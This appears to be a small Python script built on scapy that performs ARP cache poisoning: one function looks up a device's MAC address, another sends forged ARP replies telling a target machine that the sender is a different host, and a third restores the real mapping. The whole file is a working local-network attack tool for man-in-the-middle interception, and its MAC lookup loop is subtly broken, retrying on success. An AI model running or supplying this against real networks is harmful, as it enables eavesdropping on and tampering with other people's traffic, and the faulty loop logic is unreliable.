from scapy.all import *
from scapy.layers.l2 import *



def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    while ans != None:
        print("Unable to get mac for: " + ip + " retrying")
        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)

    return ans[0][1].src



def spoof(target_ip, host_ip, target_mac):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)
    self_mac = ARP().hwsrc


def restore(target_ip, host_ip):
    """
      Restores the normal process of a regular network
      This is done by sending the original informations
      (real IP and MAC of `host_ip` ) to `target_ip`
    """
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(arp_response, verbose=0, count=7)
